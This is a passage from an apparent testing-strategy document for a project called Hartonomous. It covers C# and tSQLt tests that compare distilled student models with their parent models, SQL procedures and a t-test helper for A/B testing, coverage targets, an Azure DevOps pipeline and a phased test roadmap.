            // Act - Run both models on same dataset
            var studentResults = await studentService.BatchInferAsync(testDataset);
            var parentResults = await parentService.BatchInferAsync(testDataset);
            
            // Calculate accuracy
            var studentAccuracy = CalculateAccuracy(studentResults, testDataset.Labels);
            var parentAccuracy = CalculateAccuracy(parentResults, testDataset.Labels);
            
            // Assert - Student must be within threshold of parent
            var qualityRatio = studentAccuracy / parentAccuracy;
            
            Assert.True(qualityRatio >= qualityThreshold, 
                $"Student model quality ratio {qualityRatio:P2} below threshold {qualityThreshold:P2}");
        }
        
        private double CalculateAccuracy(IEnumerable<string> predictions, IEnumerable<string> labels)
        {
            var correct = predictions.Zip(labels, (p, l) => p == l).Count(match => match);
            return (double)correct / predictions.Count();
        }
    }
}
```

### Capability Retention Tests

**Test Student Retains Parent Capabilities:**

```sql
CREATE PROCEDURE ModelValidationTests.[test StudentModel retains all parent capabilities]
AS
BEGIN
    -- Arrange
    DECLARE @ParentModelId UNIQUEIDENTIFIER = (SELECT ParentModelId FROM ParentModels WHERE ParentModelName = 'gpt-4');
    DECLARE @StudentModelId UNIQUEIDENTIFIER = (SELECT StudentModelId FROM StudentModelTaxonomy WHERE ParentModelId = @ParentModelId);
    
    -- Get parent capabilities
    DECLARE @ParentCapabilities TABLE (CapabilityName NVARCHAR(128));
    INSERT INTO @ParentCapabilities
    SELECT DISTINCT CapabilityName FROM ModelLayerCapabilities WHERE ParentModelId = @ParentModelId;
    
    -- Get student capabilities
    DECLARE @StudentCapabilities TABLE (CapabilityName NVARCHAR(128));
    INSERT INTO @StudentCapabilities
    SELECT CapabilityName FROM StudentModelTaxonomy WHERE StudentModelId = @StudentModelId;
    
    -- Assert - All parent capabilities present in student
    DECLARE @MissingCapabilities INT = (
        SELECT COUNT(*)
        FROM @ParentCapabilities pc
        WHERE NOT EXISTS (SELECT 1 FROM @StudentCapabilities sc WHERE sc.CapabilityName = pc.CapabilityName)
    );
    
    IF @MissingCapabilities > 0
        EXEC tSQLt.Fail 'Student missing parent capabilities';
END;
GO
```

### Inference Latency Tests

**Test Student Is Faster Than Parent:**

```csharp
[Theory]
[InlineData("MultilingualTranslation_Student", "gpt-4", 0.5)] // Student should be 2x faster
[InlineData("CodeGeneration_Student", "claude-3.5-sonnet", 0.3)] // 3x faster
public async Task StudentModel_Latency_FasterThanParent(
    string studentModelName, 
    string parentModelName, 
    double maxLatencyRatio)
{
    // Arrange
    var testPrompt = "Translate 'Hello, world!' to French";
    var studentService = new ModelInferenceService(studentModelName);
    var parentService = new ModelInferenceService(parentModelName);
    
    // Act - Measure student latency
    var studentStopwatch = Stopwatch.StartNew();
    await studentService.InferAsync(testPrompt);
    studentStopwatch.Stop();
    
    // Measure parent latency
    var parentStopwatch = Stopwatch.StartNew();
    await parentService.InferAsync(testPrompt);
    parentStopwatch.Stop();
    
    // Assert - Student faster
    var latencyRatio = (double)studentStopwatch.ElapsedMilliseconds / parentStopwatch.ElapsedMilliseconds;
    
    Assert.True(latencyRatio < maxLatencyRatio, 
        $"Student latency ratio {latencyRatio:P2} exceeds threshold {maxLatencyRatio:P2}");
}
```

---

## A/B Testing Framework

### SQL Procedures for A/B Tests

**Create A/B Test:**

```sql
CREATE PROCEDURE dbo.sp_CreateABTest
    @TestName NVARCHAR(128),
    @ModelA UNIQUEIDENTIFIER,  -- Control (parent or existing student)
    @ModelB UNIQUEIDENTIFIER,  -- Variant (new student)
    @TrafficSplit DECIMAL(3,2) = 0.50,  -- 50/50 by default
    @DurationDays INT = 7,
    @TestId UNIQUEIDENTIFIER OUTPUT
AS
BEGIN
    SET @TestId = NEWID();
    
    INSERT INTO ModelABTests 
    (TestId, TestName, ControlModelId, VariantModelId, TrafficSplit, TestStartTime, TestEndTime, Status)
    VALUES 
    (@TestId, @TestName, @ModelA, @ModelB, @TrafficSplit, 
     GETUTCDATE(), DATEADD(DAY, @DurationDays, GETUTCDATE()), 'Running');
    
    SELECT @TestId AS TestId;
END;
GO
```

**Route Traffic:**

```sql
CREATE FUNCTION dbo.fn_GetABTestModel
(
    @UserId UNIQUEIDENTIFIER,
    @TestId UNIQUEIDENTIFIER
)
RETURNS UNIQUEIDENTIFIER
AS
BEGIN
    DECLARE @ModelId UNIQUEIDENTIFIER;
    DECLARE @TrafficSplit DECIMAL(3,2);
    DECLARE @ControlModelId UNIQUEIDENTIFIER;
    DECLARE @VariantModelId UNIQUEIDENTIFIER;
    
    -- Get test config
    SELECT 
        @TrafficSplit = TrafficSplit,
        @ControlModelId = ControlModelId,
        @VariantModelId = VariantModelId
    FROM ModelABTests
    WHERE TestId = @TestId AND Status = 'Running';
    
    -- Hash userId to deterministic 0-1 value
    DECLARE @UserHash DECIMAL(10,9) = (
        CAST(CHECKSUM(@UserId) AS DECIMAL(10,9)) / 2147483647.0
    );
    
    -- Route based on split
    IF @UserHash < @TrafficSplit
        SET @ModelId = @ControlModelId;
    ELSE
        SET @ModelId = @VariantModelId;
    
    RETURN @ModelId;
END;
GO
```

**Collect Metrics:**

```sql
CREATE PROCEDURE dbo.sp_RecordABTestMetric
    @TestId UNIQUEIDENTIFIER,
    @UserId UNIQUEIDENTIFIER,
    @ModelId UNIQUEIDENTIFIER,
    @MetricName NVARCHAR(50),  -- 'accuracy', 'latency', 'user_satisfaction'
    @MetricValue DECIMAL(10,4)
AS
BEGIN
    INSERT INTO ABTestMetrics 
    (TestId, UserId, ModelId, MetricName, MetricValue, RecordedAtUtc)
    VALUES 
    (@TestId, @UserId, @ModelId, @MetricName, @MetricValue, GETUTCDATE());
END;
GO
```

**Analyze Results:**

```sql
CREATE PROCEDURE dbo.sp_AnalyzeABTest
    @TestId UNIQUEIDENTIFIER
AS
BEGIN
    SELECT 
        mat.TestName,
        m.ModelId,
        m.ModelName,
        COUNT(DISTINCT atm.UserId) AS UniqueUsers,
        AVG(CASE WHEN atm.MetricName = 'accuracy' THEN atm.MetricValue END) AS AvgAccuracy,
        AVG(CASE WHEN atm.MetricName = 'latency' THEN atm.MetricValue END) AS AvgLatencyMs,
        AVG(CASE WHEN atm.MetricName = 'user_satisfaction' THEN atm.MetricValue END) AS AvgSatisfaction
    FROM ModelABTests mat
    JOIN ABTestMetrics atm ON mat.TestId = atm.TestId
    JOIN (
        SELECT ControlModelId AS ModelId, 'Control' AS ModelName FROM ModelABTests WHERE TestId = @TestId
        UNION ALL
        SELECT VariantModelId AS ModelId, 'Variant' AS ModelName FROM ModelABTests WHERE TestId = @TestId
    ) m ON atm.ModelId = m.ModelId
    WHERE mat.TestId = @TestId
    GROUP BY mat.TestName, m.ModelId, m.ModelName;
END;
GO
```

### Statistical Significance Tests

**C# Helper for T-Test:**

```csharp
using MathNet.Numerics.Statistics;

public class ABTestAnalyzer
{
    public ABTestResult AnalyzeTest(Guid testId)
    {
        // Fetch metrics from database
        var controlMetrics = GetMetrics(testId, isControl: true);
        var variantMetrics = GetMetrics(testId, isControl: false);
        
        // Calculate t-test for accuracy
        var tStat = CalculateTTest(controlMetrics.Accuracy, variantMetrics.Accuracy);
        var pValue = GetPValue(tStat, controlMetrics.Accuracy.Count + variantMetrics.Accuracy.Count - 2);
        
        // Check significance (α = 0.05)
        var isSignificant = pValue < 0.05;
        
        // Calculate effect size (Cohen's d)
        var effectSize = CalculateCohenD(controlMetrics.Accuracy, variantMetrics.Accuracy);
        
        return new ABTestResult
        {
            TestId = testId,
            PValue = pValue,
            IsSignificant = isSignificant,
            EffectSize = effectSize,
            Recommendation = isSignificant && effectSize > 0.2 
                ? "Promote variant to production" 
                : "Keep control model"
        };
    }
    
    private double CalculateTTest(List<double> sample1, List<double> sample2)
    {
        var mean1 = sample1.Mean();
        var mean2 = sample2.Mean();
        var var1 = sample1.Variance();
        var var2 = sample2.Variance();
        var n1 = sample1.Count;
        var n2 = sample2.Count;
        
        var pooledVar = ((n1 - 1) * var1 + (n2 - 1) * var2) / (n1 + n2 - 2);
        var tStat = (mean1 - mean2) / Math.Sqrt(pooledVar * (1.0 / n1 + 1.0 / n2));
        
        return tStat;
    }
    
    private double CalculateCohenD(List<double> sample1, List<double> sample2)
    {
        var mean1 = sample1.Mean();
        var mean2 = sample2.Mean();
        var var1 = sample1.Variance();
        var var2 = sample2.Variance();
        
        var pooledStd = Math.Sqrt((var1 + var2) / 2);
        return (mean2 - mean1) / pooledStd;
    }
}
```

---

## Coverage Goals & Metrics

### Current vs Target Coverage

**As of November 12, 2025:**

| Component | Current Coverage | Target (6mo) | Critical Path Target |
|-----------|------------------|--------------|---------------------|
| **C# API Layer** | 0% | 80% | 95% |
| Hartonomous.Api | 0% | 80% | 95% |
| Hartonomous.Core | 0% | 85% | 95% |
| Hartonomous.Infrastructure | 0% | 75% | 90% |
| **SQL Stored Procedures** | 0% | 70% | 95% |
| Billing procedures | 0% | 100% | 100% |
| OODA loop procedures | 0% | 90% | 95% |
| Distillation procedures | 0% | 80% | 90% |
| **CLR Functions** | 0% | 85% | 95% |
| Vector operations | 0% | 90% | 95% |
| Embedding generation | 0% | 85% | 95% |
| Model inference | 0% | 80% | 90% |
| **Integration Tests** | 0% | 70% | 90% |
| SQL ↔ EF Core | 0% | 80% | 95% |
| Service Broker | 0% | 75% | 90% |
| Neo4j sync | 0% | 70% | 85% |
| **Performance Tests** | 0% | 100% | 100% |
| API endpoints | 0% | 100% | 100% |
| SQL queries | 0% | 100% | 100% |
| FILESTREAM I/O | 0% | 100% | 100% |

### Metrics Collection

**CI/CD Integration (Azure DevOps):**

```yaml
# azure-pipelines.yml
trigger:
  branches:
    include:
      - main
      - develop

stages:
  - stage: Test
    jobs:
      - job: UnitTests
        pool:
          vmImage: 'windows-latest'
        steps:
          - task: DotNetCoreCLI@2
            inputs:
              command: 'test'
              projects: '**/*Tests.csproj'
              arguments: '--configuration Release --collect:"XPlat Code Coverage"'
          
          - task: PublishCodeCoverageResults@1
            inputs:
              codeCoverageTool: 'Cobertura'
              summaryFileLocation: '$(Agent.TempDirectory)/**/*coverage.cobertura.xml'
      
      - job: SQLTests
        pool:
          vmImage: 'windows-latest'
        steps:
          - script: |
              sqlcmd -S localhost -d HartonomousTest -Q "EXEC tSQLt.RunAll"
            displayName: 'Run SQL Unit Tests'
      
      - job: PerformanceTests
        pool:
          vmImage: 'ubuntu-latest'
        steps:
          - task: DotNetCoreCLI@2
            inputs:
              command: 'test'
              projects: '**/Hartonomous.PerformanceTests.csproj'
          
          - script: |
              # Parse NBomber results
              cat TestResults/performance-report.json
            displayName: 'Display Performance Metrics'
```

**Coverage Badges (README.md):**

```markdown
![Unit Test Coverage](https://img.shields.io/azure-devops/coverage/hartonomous/hartonomous/1)
![SQL Test Coverage](https://img.shields.io/badge/sql--coverage-0%25-red)
![Performance SLA](https://img.shields.io/badge/p95--latency-<2s-green)
```

---

## Implementation Roadmap

### Phase 1: Foundation (Weeks 1-4)

**Week 1: Test Infrastructure**
- [ ] Install xUnit, Moq, NBomber, tSQLt
- [ ] Create test project structure
- [ ] Set up DatabaseFixture for integration tests
- [ ] Configure CI/CD pipeline

**Week 2: Critical Path Unit Tests**
- [ ] Billing enforcement tests (100% coverage)
- [ ] OODA loop hypothesis generation tests
- [ ] CLR vector operation tests
- [ ] Student model distillation tests

**Week 3: Integration Tests**
- [ ] SQL ↔ EF Core mapping tests
- [ ] Service Broker message flow tests
- [ ] Neo4j sync integration tests

**Week 4: Performance Baseline**
- [ ] Benchmark all API endpoints
- [ ] Benchmark critical SQL queries
- [ ] Record baseline metrics

### Phase 2: Expansion (Weeks 5-12)

**Weeks 5-8: Comprehensive Unit Tests**
- [ ] API controller tests (80% coverage)
- [ ] Service layer tests (85% coverage)
- [ ] SQL procedure tests (70% coverage)

**Weeks 9-10: Chaos Engineering**
- [ ] Network partition tests
- [ ] Process kill tests
- [ ] FILESTREAM corruption tests

**Weeks 11-12: Security & Compliance**
- [ ] GDPR explainability tests
- [ ] Billing quota bypass tests
- [ ] CLR sandboxing tests

### Phase 3: Automation (Weeks 13-24)

**Weeks 13-16: Student Model Validation**
- [ ] Accuracy regression tests
- [ ] Capability retention tests
- [ ] Inference latency benchmarks

**Weeks 17-20: A/B Testing Framework**
- [ ] Implement SQL procedures
- [ ] Build statistical analysis tools
- [ ] Deploy first A/B test (student vs parent)

**Weeks 21-24: Continuous Monitoring**
- [ ] Synthetic monitoring (Pingdom, New Relic)
- [ ] Anomaly detection (Azure Monitor)
- [ ] Automated rollback on test failures

---

## References

**Testing Frameworks:**
- [xUnit.net](https://xunit.net/)
- [tSQLt](https://tsqlt.org/)
- [NBomber](https://nbomber.com/)
- [Moq](https://github.com/moq/moq4)

**Test-Driven Development:**
- [TDD by Example (Kent Beck)](https://www.amazon.com/Test-Driven-Development-Kent-Beck/dp/0321146530)
- [Growing Object-Oriented Software, Guided by Tests](https://www.amazon.com/Growing-Object-Oriented-Software-Guided-Tests/dp/0321503627)

**Chaos Engineering:**
- [Principles of Chaos Engineering](https://principlesofchaos.org/)
- [Chaos Engineering (O'Reilly)](https://www.oreilly.com/library/view/chaos-engineering/9781491988459/)

**A/B Testing:**
- [Statistical Inference for A/B Testing](https://arxiv.org/abs/1905.08295)
- [Trustworthy Online Controlled Experiments](https://www.amazon.com/Trustworthy-Online-Controlled-Experiments-Practical/dp/1108724264)
